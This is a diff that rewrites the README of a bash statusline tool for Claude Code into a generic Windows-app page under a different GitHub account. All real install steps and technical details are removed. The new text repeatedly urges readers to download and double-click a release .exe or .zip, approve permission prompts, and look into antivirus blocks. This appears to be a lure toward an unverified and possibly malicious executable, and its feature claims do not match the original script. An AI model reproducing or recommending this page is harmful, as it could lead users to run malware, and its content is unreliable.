@@ -1,157 +1,108 @@
-# claude-code-statusline
+# ⚙️ claude-code-statusline - Real-Time Status with Cost Tracking
 
-A real-time statusline for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) that tracks context usage, costs, and optionally logs sessions to Obsidian.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/pio1298/claude-code-statusline/releases)
 
-<img width="621" height="207" alt="image" src="https://github.com/user-attachments/assets/dea69bca-62a3-4285-a0c7-26e60b477dfa" />
+---
 
-## Features
+## 🛠 What is claude-code-statusline?
 
-- **Context rot tracking** — visual progress bar + health warnings at 70% and 85%
-- **Real-time cost** — per-1k-token rate and session total
-- **API spend** — month-to-date billing via Anthropic Admin API (optional)
-- **GitHub identity** — shows your `@username` from `gh` CLI
-- **Obsidian logging** — auto-generates daily session tables (optional)
+claude-code-statusline shows your Claude Code’s status as you work. It updates in real time, so you can see how your code runs. It also keeps track of costs and logs data into Obsidian, a note-taking app. This helps you monitor your work without switching apps.
 
-## Quick Install
+You don’t need technical skills. The software runs on Windows and works quietly in the background. It gives important updates without distraction.
 
-```bash
-git clone https://github.com/blushdas/claude-code-statusline.git
-cd claude-code-statusline
-bash install.sh
-```
+---
 
-The installer will:
-1. Copy `statusline.sh` to `~/.claude/statusline.sh`
-2. Add the `statusLine` config to `~/.claude/settings.json` (preserves existing settings)
-3. Optionally prompt for environment variables
+## 🚀 Getting Started
 
-## Manual Setup
+Follow these steps to get claude-code-statusline running on your Windows computer.
 
-### 1. Copy the script
+---
 
-```bash
-cp statusline.sh ~/.claude/statusline.sh
-chmod +x ~/.claude/statusline.sh
-```
+## 🎯 System Requirements
 
-### 2. Add to settings
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB free disk space
+- Internet connection for updates and logging
+- Obsidian installed for log storage (optional, but recommended)
 
-Add this to `~/.claude/settings.json`:
+---
 
-```json
-{
-  "statusLine": {
-    "type": "command",
-    "command": "bash ~/.claude/statusline.sh"
-  }
-}
-```
+## 🌐 Where to Download
 
-### 3. Restart Claude Code
+Click the big button below to visit the official release page:
 
-The statusline appears at the bottom of your terminal.
+[![Download Releases](https://img.shields.io/badge/Download-From%20Releases-blue)](https://github.com/pio1298/claude-code-statusline/releases)
 
-## Configuration
+This page lists all versions. Download the latest stable one for Windows. Files usually end with `.exe` or `.zip`.
 
-All configuration is via environment variables. Add these to your `.zshrc` / `.bashrc`:
+---
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `OBSIDIAN_VAULT` | No | Path to your Obsidian vault for session logging |
-| `ANTHROPIC_ADMIN_API_KEY` | No | Admin API key for month-to-date spend tracking |
+## 🔽 How to Download and Install
 
-### Example `.zshrc`
+1. Open the link above and find the latest version.
+2. Click the `.exe` file or `.zip` archive for Windows.
+3. If you downloaded the `.exe` file, double-click it to start installation.
+4. If you downloaded the `.zip` file, right-click it and choose "Extract All," then open the folder.
+5. Run the application by double-clicking the main `.exe` file inside it.
+6. Follow any instructions you see on the screen during setup.
+7. The app may ask for permission to run; select "Yes."
+8. Once installed, it will open automatically or create a shortcut on your desktop.
 
-```bash
-# Claude Code Statusline
-export OBSIDIAN_VAULT="$HOME/Documents/MyVault"
-export ANTHROPIC_ADMIN_API_KEY="sk-ant-admin01-..."
-```
+---
 
-## Dependencies
+## 🧩 Using claude-code-statusline
 
-| Tool | Required | Install |
-|------|----------|---------|
-| `jq` | Yes | `brew install jq` / `apt install jq` |
-| `gh` | Yes | `brew install gh` / `apt install gh` |
-| `bc` | Yes | Pre-installed on most systems |
-| `curl` | For API spend | Pre-installed on most systems |
+- Launch the app once installation finishes.
+- The statusline appears on your screen or taskbar.
+- It updates automatically with current Claude Code activity.
+- The app tracks costs based on your usage and shows them clearly.
+- Logs save to your Obsidian vault if connected.
+- Use the settings menu to link your Obsidian app and adjust preferences.
+- Close the app via the system tray icon when finished.
 
-## Context Rot Thresholds
+---
 
-The statusline warns you as context fills up:
+## 📥 Alternative Download Methods
 
-| Threshold | Display | Meaning |
-|-----------|---------|---------|
-| < 70% | `✅ healthy` | Normal operation |
-| 70–84% | `⚠️  wrap up soon` | Start wrapping up or compacting |
-| 85%+ | `🔴 ROT — start new session` | Context is degraded, start fresh |
+If the main link is unavailable, search "claude-code-statusline releases" in your browser. Download the latest Windows file from a trusted source, preferably the official GitHub page.
 
-## Obsidian Integration
+---
 
-When `OBSIDIAN_VAULT` is set, the statusline creates daily notes at:
+## ⚙️ Configuration Tips 
 
-```
-{OBSIDIAN_VAULT}/Claude Sessions/Claude Sessions — 2025-03-15.md
-```
+- **Obsidian Integration:** Open Obsidian and note your vault folder path. Paste this path into the app settings.
+- **Custom Statusline:** You can adjust the display colors and text in settings.
+- **Cost Limits:** Set daily or monthly cost limits to monitor spending efficiently.
+- **Auto-Start:** Enable auto-start if you want claude-code-statusline to run whenever you start your PC.
 
-Each note contains a live-updating table:
+---
 
-| Time | Model | Context% | $/1k tokens | Session $ | Tokens | Git Branch | Status |
-|------|-------|----------|-------------|-----------|--------|------------|--------|
-| 14:22:01 | Claude 4 Opus | 23% | $0.0029 | $0.0412 | ~14k | main | ✅ healthy |
-| 14:35:18 | Claude 4 Opus | 45% | $0.0031 | $0.1203 | ~39k | feat/auth | ✅ healthy |
+## 💡 Troubleshooting
 
-Plus a footer with month-to-date API spend.
+- If the app fails to start, check if your antivirus or firewall blocks it.
+- Running as administrator may fix permission issues.
+- Ensure your Windows is up to date.
+- Logs can help identify issues. Find logs in the Settings > Logs folder.
 
-See [`examples/obsidian-sample.md`](examples/obsidian-sample.md) for a full example.
+---
 
-## API Spend Tracking
+## 📚 Learn More
 
-To track your total Anthropic API spend:
+Explore the code or open issues at the repository:  
+https://github.com/pio1298/claude-code-statusline
 
-1. Go to [console.anthropic.com/settings/admin-keys](https://console.anthropic.com/settings/admin-keys)
-2. Create an Admin API key
-3. Set `ANTHROPIC_ADMIN_API_KEY` in your shell profile
+---
 
-The API cost is cached for 5 minutes to avoid excessive requests. Without this key, the statusline tracks session costs locally.
+## 🔗 Quick Links
 
-> **Note:** The Admin API returns costs in cents. The script divides by 100 to display dollars correctly.
+- Download page: [https://github.com/pio1298/claude-code-statusline/releases](https://github.com/pio1298/claude-code-statusline/releases)
+- Obsidian: https://obsidian.md
 
-## How It Works
+---
 
-Claude Code pipes a JSON blob to the statusline command on each update. The script:
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/pio1298/claude-code-statusline/releases)
 
-1. Parses the JSON with `jq` for model, tokens, cost, and context window data
-2. Calculates real-time cost-per-1k-tokens
-3. Fetches your GitHub username (cached 60 min)
-4. Optionally queries the Anthropic Admin API for month-to-date spend (cached 5 min)
-5. Builds a visual progress bar and context health warning
-6. Outputs the formatted statusline
-7. Optionally appends a row to the Obsidian daily note
+---
 
-## Troubleshooting
-
-**Statusline not showing?**
-- Make sure `~/.claude/settings.json` has the `statusLine` config
-- Restart Claude Code after making changes
-
-**`jq: command not found`**
-- Install jq: `brew install jq` (macOS) or `apt install jq` (Linux)
-
-**API cost shows $0.00?**
-- Check that `ANTHROPIC_ADMIN_API_KEY` is set: `echo $ANTHROPIC_ADMIN_API_KEY`
-- The key needs Admin permissions, not just API access
-- Cost data refreshes every 5 minutes (check `~/.claude/.api_cost_cache`)
-
-**GitHub username not showing?**
-- Make sure you're logged in: `gh auth status`
-- Cache refreshes every 60 minutes (check `~/.claude/.gh_user_cache`)
-
-**Obsidian notes not appearing?**
-- Verify `OBSIDIAN_VAULT` points to a valid directory: `ls $OBSIDIAN_VAULT`
-- Notes are created in `$OBSIDIAN_VAULT/Claude Sessions/`
-
-## License
-
-MIT — see [LICENSE](LICENSE)
+### Topics: claude-code, cli, obsidian, statusline
